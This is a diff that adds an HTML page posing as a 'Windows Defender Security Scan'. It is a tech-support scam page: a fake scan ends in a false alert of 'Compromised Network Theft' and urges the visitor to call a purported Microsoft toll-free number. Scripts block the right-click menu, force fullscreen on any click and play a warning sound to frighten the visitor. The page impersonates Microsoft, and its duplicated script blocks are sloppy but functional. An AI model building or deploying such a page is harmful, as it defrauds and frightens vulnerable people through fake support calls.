@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Defender Security Scan</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .security-box {
+            width: 480px;
+            background: white;
+            padding: 25px;
+            border-radius: 14px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            position: relative;
+            border-top: 6px solid #0078D7;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            width: 80px;
+            animation: fadeInDown 1s ease-in-out;
+        }
+
+        .security-header {
+            font-size: 22px;
+            font-weight: bold;
+            background: linear-gradient(90deg, #0078D7, #00a8f3, #0078D7);
+            background-size: 200% auto;
+            color: white;
+            padding: 8px;
+            border-radius: 6px;
+            display: inline-block;
+            animation: gradientMove 3s linear infinite;
+        }
+
+        .scan-container {
+            margin: 20px auto;
+        }
+
+        .scan-animation {
+            width: 85px;
+            height: 85px;
+            border-radius: 50%;
+            border: 6px solid #0078D7;
+            border-top: 6px solid transparent;
+            margin: 15px auto;
+            animation: spin 1s linear infinite, pulse 1.5s ease-in-out infinite;
+        }
+
+        .progress-container {
+            width: 100%;
+            background: #e0e0e0;
+            border-radius: 12px;
+            height: 12px;
+            margin: 12px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 12px;
+            background: #0078D7;
+            transition: width 0.5s ease-in-out;
+        }
+
+        .scan-status {
+            font-size: 17px;
+            margin: 10px 0;
+            font-weight: bold;
+            color: #0078D7;
+        }
+
+        .error-message {
+            display: none;
+            padding: 12px;
+            background: #D32F2F;
+            color: white;
+            border-radius: 6px;
+            margin-top: 12px;
+            font-weight: bold;
+            animation: zoomInOut 0.5s ease-in-out;
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            z-index: 10;
+        }
+
+        .scan-btn {
+            background: #0078D7;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            transition: 0.3s;
+        }
+
+        .scan-btn:hover {
+            background: #005a9e;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #666;
+            margin-top: 12px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+        @keyframes zoomInOut {
+            0% { transform: scale(0.8); opacity: 0; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body oncontextmenu="return false" onclick="enforceFullScreen(event)">
+    <div class="security-box">
+	<!-- Audio Player (hidden) -->
+        <audio id="warning-sound" src="microsoft_warning.mp3" type="audio/mp3"></audio>
+        <script>
+            function enforceFullScreen(event) {
+                event.preventDefault();
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen();
+                }
+            }
+
+            function startScan() {
+                let progressBar = document.getElementById('progress-bar');
+                let errorMessage = document.getElementById('error-message');
+                let scanStatus = document.querySelector('.scan-status');
+                let warningSound = document.getElementById('warning-sound');
+                let progress = 0;
+                let interval = setInterval(() => {
+                    progress += 10;
+                    progressBar.style.width = progress + '%';
+                    scanStatus.innerText = `Scanning... ${progress}%`;
+                    if (progress >= 90) {
+                        progressBar.style.background = '#D32F2F';
+                        errorMessage.style.display = 'block';
+                        warningSound.play();
+                        clearInterval(interval);
+                    }
+                }, 500);
+            }
+        </script>
+        <div class="logo-container">
+            <img src="Microsoft-Logo.png" alt="Microsoft Logo" class="logo">
+        </div>
+        <div class="security-header">Windows Defender Security Scan</div>
+        <div class="scan-container">
+            <div class="scan-animation"></div>
+        </div>
+        <div class="scan-status">Initializing Scan...</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        <div class="error-message" id="error-message">
+            ⚠️ Compromised Network Theft Detected! Immediate action required.
+            <br>
+            Call Microsoft Toll Free Helpline USA/CA: +1 (800) 900-9990
+            <br><br>
+            DO NOT TURN OFF OR RESTART YOUR DEVICE or you might lose all files, data, and documents on your PC/laptop, 
+            causing corruption or even a crash! Immediately call Microsoft Geeks for assistance with this vulnerability.
+        </div>
+        <button class="scan-btn" onclick="startScan()">Scan Now</button>
+        <div class="footer">© 2025 Windows Defender. All Rights Reserved.</div>
+    </div>
+    <script>
+        let scanProgress = 0;
+        let progressBar = document.getElementById("progress-bar");
+        let errorMessage = document.getElementById("error-message");
+
+        function startScan() {
+            let scanInterval = setInterval(function() {
+                if (scanProgress < 100) {
+                    scanProgress += 1;
+                    progressBar.style.width = scanProgress + "%";
+                    if (scanProgress >= 95) {
+                        progressBar.style.background = "#D32F2F";  // Red color after 95%
+                    }
+                    if (scanProgress === 100) {
+                        clearInterval(scanInterval);
+                        displayErrorMessage();
+                    }
+                }
+            }, 100);  // Progress increases every 100ms
+        }
+
+        function displayErrorMessage() {
+            errorMessage.style.display = 'block';  // Show the error message
+        }
+
+        function enforceFullScreen(event) {
+            event.preventDefault();
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        }
+    </script>
+	        <!-- Audio Player (hidden) -->
+        <audio id="warning-sound" src="microsoft_warning.mp3" type="audio/mp3" preload="auto"></audio>
+        <script>
+            function enforceFullScreen(event) {
+                event.preventDefault();
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen();
+                }
+            }
+
+            function startScan() {
+                let progressBar = document.getElementById('progress-bar');
+                let errorMessage = document.getElementById('error-message');
+                let scanStatus = document.querySelector('.scan-status');
+                let warningSound = document.getElementById('warning-sound');
+                let progress = 0;
+                let interval = setInterval(() => {
+                    progress += 10;
+                    progressBar.style.width = progress + '%';
+                    scanStatus.innerText = `Scanning... ${progress}%`;
+                    if (progress >= 90) {
+                        progressBar.style.background = '#D32F2F';
+                        errorMessage.style.display = 'block';
+                        warningSound.play().catch(error => {
+                            console.error('Audio playback failed:', error);
+                            warningSound.muted = false;
+                            warningSound.play();
+                        });
+                        clearInterval(interval);
+                    }
+                }, 500);
+            }
+        </script>
+    </body>
+</html>
+
+</body>
+</html>
